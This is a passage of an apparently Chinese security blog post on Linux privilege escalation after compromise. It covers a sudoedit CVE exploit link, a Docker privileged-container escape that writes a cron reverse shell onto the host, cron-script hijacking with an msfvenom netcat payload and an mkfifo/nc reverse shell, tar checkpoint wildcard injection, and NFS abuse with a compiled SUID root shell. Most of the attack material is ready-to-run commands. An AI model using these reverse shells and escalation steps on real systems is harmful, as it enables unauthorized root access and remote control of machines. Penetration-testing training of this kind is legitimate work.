+    >CVE-2023-22809：Sudo权限提升漏洞-腾讯云开发者社区-腾讯云</a></p>
+<p><strong>影响版本：****<font style="color:rgb(51, 51, 51);">sudo 1.8 到 1.9.12p1</font></strong></p>
+<p><strong><font style="color:rgb(51, 51, 51);">漏洞描述：由于Sudo中的sudoedit对处理用户提供的环境变量（如SUDO_EDITOR、VISUAL和EDITOR）中传递的额外参数存在缺陷。当用户指定的编辑器包含绕过sudoers策略的 &quot; &ndash;&quot; 参数时，拥有sudoedit访问权限的本地攻击者可通过将任意条目附加到要处理的文件列表中，最终在目标系统上实现权限提升。</font></strong></p>
+<p><strong><font style="color:rgb(51, 51, 51);">EXP：</font></strong><a class="link" href="https://github.com/n3m1sys/CVE-2023-22809-sudoedit-privesc/"  target="_blank" rel="noopener"
+    ><strong>https://github.com/n3m1sys/CVE-2023-22809-sudoedit-privesc/</strong></a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">.</span><span class="o">/</span><span class="n">exploit</span><span class="p">.</span><span class="na">sh</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="24docker容器逃逸提权">2.4.Docker容器逃逸提权
+</h2><p><a class="link" href="https://blog.csdn.net/qq_43531669/article/details/145325152"  target="_blank" rel="noopener"
+    >后渗透——Docker容器逃逸-CSDN博客</a></p>
+<p><a class="link" href="https://www.cnblogs.com/kqdssheng/p/18275541"  target="_blank" rel="noopener"
+    >Linux 提权-Docker 容器 - 扛枪的书生 - 博客园</a></p>
+<p><a class="link" href="https://blog.csdn.net/weixin_57385269/article/details/129058806"  target="_blank" rel="noopener"
+    >Docker逃逸：原理、方法与防范-CSDN博客</a></p>
+<h4 id="查看是否存在docker环境">查看是否存在docker环境
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="err">：</span><span class="n">查找</span><span class="p">.</span><span class="na">dockerenv文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">docker下默认存在dockerenv文件</span><span class="err">，</span><span class="n">而非docker环境中则没有</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">1</span><span class="p">.</span><span class="na">2</span><span class="p">.</span><span class="na">查询cgroup进程</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">1</span><span class="o">/</span><span class="n">cgroup</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">1</span><span class="p">.</span><span class="na">3</span><span class="p">.</span><span class="na">查看容器环境变量</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">1</span><span class="o">/</span><span class="n">environ</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="首先以特权模式运行一个docker容器">首先以特权模式运行一个docker容器
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">docker</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="o">-</span><span class="n">it</span><span class="w"> </span><span class="o">--</span><span class="n">privileged</span><span class="w"> </span><span class="n">镜像ID</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="查看磁盘文件">查看磁盘文件
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">fdisk</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/40.png"
+	width="1197"
+	height="724"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/40_hu_a778ea618ea4f618.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/40_hu_3ec5840ea70a958.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="165"
+		data-flex-basis="396px"
+	
+></p>
+<h4 id="新建一个目录将devvda1挂载至新建的目录">新建一个目录,将/dev/vda1挂载至新建的目录
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">mkdir</span><span class="w"> </span><span class="o">/</span><span class="n">test</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mount</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">vda1</span><span class="w"> </span><span class="o">/</span><span class="n">test</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="写入计划任务到宿主机">写入计划任务到宿主机
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">echo</span><span class="w"> </span><span class="err">&#39;</span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">&gt;&amp;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">ip</span><span class="o">/</span><span class="n">4000</span><span class="w"> </span><span class="n">0</span><span class="o">&gt;&amp;</span><span class="n">1</span><span class="err">&#39;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">test</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">cron</span><span class="o">/</span><span class="n">root</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvvp</span><span class="w"> </span><span class="n">6666</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="25定时任务提权">2.5.定时任务提权
+</h2><p><em><em>定时任务(cron job)被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron是Linux或者类Uniⅸ系统中最为实用的工具之一。cron服务（守护进程）在系统后台运行，并且会持续地检查/etc/crontab文件和/etc/cron</em>/目录。它同样也会检查/var/spool/cron/目录。</em>*</p>
+<p><strong>原理：****<font style="color:#DF2A3F;">提权的原理为计划任务以</font></strong><a class="link" href="https://zhida.zhihu.com/search?content_id=221073054&amp;content_type=Article&amp;match_order=1&amp;q=root%E6%9D%83%E9%99%90&amp;zhida_source=entity"  target="_blank" rel="noopener"
+    ><strong><font style="color:#DF2A3F;">root权限</font></strong></a><strong><font style="color:#DF2A3F;">运行，计划任务中的脚本其他用户有写入的权限，或者脚本所属组为其他用户，则可以进行计划任务提权。</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">crontab</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w">          </span><span class="c1">//查看当前用户的计划任务</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span><span class="w">    </span><span class="c1">//查看服务器所有用户的计划任务</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/41.png"
+	width="1887"
+	height="864"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/41_hu_6f9138ef600a087e.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/41_hu_14b110823a77274a.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="524px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//每分钟以root权限执行/etc/cron.daily目录下的backup脚本</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">*/</span><span class="n">1</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="na">daily</span><span class="o">/</span><span class="n">backup</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>如果当前低权限用户有权限修改这个backup脚本，那么就可以写个反弹shell命令，计划任务每分钟就会以root权限反弹shell到本机实现权限提升</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">msfvenom</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">reverse_netcat</span><span class="w"> </span><span class="n">lhost</span><span class="o">=</span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">165</span><span class="p">.</span><span class="na">31</span><span class="w"> </span><span class="n">lport</span><span class="o">=</span><span class="n">9999</span><span class="w"> </span><span class="n">R</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/42.png"
+	width="1591"
+	height="381"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/42_hu_e29e694186cb1895.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/42_hu_610b15a5795c86fa.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="417"
+		data-flex-basis="1002px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="w"> </span><span class="n">使用命令</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s">&#34;mkfifo /tmp/htukkim; nc 192.168.165.31 9999 0&lt;/tmp/htukkim | /bin/sh &gt;/tmp/htukkim 2&gt;&amp;1; rm /tmp/htukkim&#34;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span><span class="na">sh</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="o">+</span><span class="n">x</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span><span class="na">sh</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="s">&#34;--checkpoint-action=exec=sh shell.sh&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="s">&#34;--checkpoint=1&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="n">9999</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>此时成功接收到root用户的反弹shell会话</strong></p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/43.png"
+	width="1810"
+	height="590"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/43_hu_f3692509af14143c.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/43_hu_c99001c564c6396c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="306"
+		data-flex-basis="736px"
+	
+></p>
+<h2 id="26nfs共享服务提权">2.6.NFS共享服务提权
+</h2><p><a class="link" href="https://cloud.tencent.com/developer/article/1708369"  target="_blank" rel="noopener"
+    >Linux提权姿势二：利用NFS提权-腾讯云开发者社区-腾讯云</a></p>
+<p><a class="link" href="https://blog.csdn.net/weixin_30878111/article/details/142215357"  target="_blank" rel="noopener"
+    >Linux 提权-NFS 共享-CSDN博客</a></p>
+<p><strong><font style="color:rgb(34, 34, 34);">NFS，即network file system，是一种网络文件系统，它允许用户将某个目录或文件挂载到网络上以实现共享。默认情况下，NFS使用2049端口进行通信，其功能与Windows中的文件共享类似。然而，如果NFS的配置不当，就可能被利用来提升特权级别。</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">exports</span><span class="w">      </span><span class="c1">//查看是否开启NFS</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>/etc/exports</code>是 Linux 系统中用于配置 NFS（网络文件系统） 共享的配置文件，它定义了哪些目录可以被网络中的其他计算机访问，以及这些计算机的访问权限。</p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/44.png"
+	width="1736"
+	height="536"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/44_hu_900832b7d1c2425f.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/44_hu_23486e51f78d47e7.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="323"
+		data-flex-basis="777px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">peter</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">rw</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>如上图NFS配置可知，/home/peter这是你想要共享给网络中其他计算机的目录。这里的 <strong><code>*****</code></strong> 是一个通配符，表示允许 任何网络中的客户端 访问这个共享目录。表示允许客户端对共享目录进行 读写（read-write） 操作。</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">showmount</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">165</span><span class="p">.</span><span class="na">3</span><span class="w">         
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//查询 NFS 服务器（192.168.165.3）当前共享（导出）的所有目录及其访问权限。</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>创建NFS目录并挂载</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="w"> </span><span class="n">使用命令</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mkdir</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">nfs</span><span class="w">         </span><span class="n">Kali攻击机进行的操做</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mount</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">rw</span><span class="p">,</span><span class="n">vers</span><span class="o">=</span><span class="n">3</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">165</span><span class="p">.</span><span class="na">3</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">peter</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">nfs</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">将</span><span class="w"> </span><span class="n">NFS</span><span class="w"> </span><span class="n">服务器</span><span class="err">（</span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">165</span><span class="p">.</span><span class="na">3</span><span class="err">）</span><span class="n">上的共享目录</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">peter</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">挂载到本地目录</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">nfs</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">使用</span><span class="w"> </span><span class="n">NFSv3</span><span class="w"> </span><span class="n">协议</span><span class="err">（</span><span class="n">vers</span><span class="o">=</span><span class="n">3</span><span class="err">）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">以读写模式</span><span class="err">（</span><span class="n">rw</span><span class="err">）</span><span class="n">挂载</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/45.png"
+	width="1816"
+	height="511"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/45_hu_1eb3bf4fcfdaa38c.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/45_hu_45b3618fa5f6cc3b.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="355"
+		data-flex-basis="852px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="err">&#39;#</span><span class="n">include</span><span class="w"> </span><span class="o">&lt;</span><span class="n">unistd</span><span class="p">.</span><span class="na">h</span><span class="o">&gt;</span><span class="err">\</span><span class="n">n</span><span class="err">#</span><span class="n">include</span><span class="w"> </span><span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="na">h</span><span class="o">&gt;</span><span class="err">\</span><span class="n">n</span><span class="err">\</span><span class="n">nint</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">setgid</span><span class="p">(</span><span class="n">0</span><span class="p">);</span><span class="w"> </span><span class="n">setuid</span><span class="p">(</span><span class="n">0</span><span class="p">);</span><span class="w"> </span><span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="p">}</span><span class="err">&#39;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">nfs</span><span class="o">/</span><span class="n">suid</span><span class="o">-</span><span class="n">shell</span><span class="p">.</span><span class="na">c</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">gcc</span><span class="w"> </span><span class="o">-</span><span class="kd">static</span><span class="w"> </span><span class="n">suid</span><span class="o">-</span><span class="n">shell</span><span class="p">.</span><span class="na">c</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">suid</span><span class="o">-</span><span class="n">shell1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chmod</span><span class="w"> </span><span class="o">+</span><span class="n">s</span><span class="w"> </span><span class="n">suid</span><span class="o">-</span><span class="n">shell1</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/46.png"
+	width="1268"
+	height="527"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/46_hu_f9ab307d6173ffa5.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/46_hu_d77ecd35c9689ca9.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="240"
+		data-flex-basis="577px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>By Lsec</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Sep 13, 2025 23:39 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/logo.e6d4ff2f7b374243e5e443023ed1f0f5_hu_449398934a734686.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 内网权限维持技术"
+                        
+                        data-hash="md5-5tT/L3s3QkPl5EMCPtHw9Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">内网权限维持技术</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E5%86%85%E7%BD%91%E8%BF%9C%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E5%86%85%E7%BD%91%E8%BF%9C%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/logo.27e26041cc2856a527adabb8c78494ea_hu_cc9bfe2f1440a103.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 内网远控工具利用思路"
+                        
+                        data-hash="md5-J&#43;JgQcwoVqUnrau4x4SU6g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">内网远控工具利用思路</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/jsrpc%E5%AD%A6%E4%B9%A0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/jsrpc%E5%AD%A6%E4%B9%A0/logo.4998b054f7e9bad9a9ac6ae767245e56_hu_a1ea4ca8cd072b24.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post JSRPC学习"
+                        
+                        data-hash="md5-SZiwVPfputmprGrnZyReVg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JSRPC学习</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/">
+        
+        
+            <div class="article-image">
+                <img src="/p/android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/logo.2f72206d01f27f5ac5d94e76679a02e4_hu_2a2f619f1c021c7c.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Android逆向基础"
+                        
+                        data-hash="md5-L3IgbQHyf1rF2U52Z5oC5A==">
+                
+            </div>
+        
+
+        <div class="article-details">
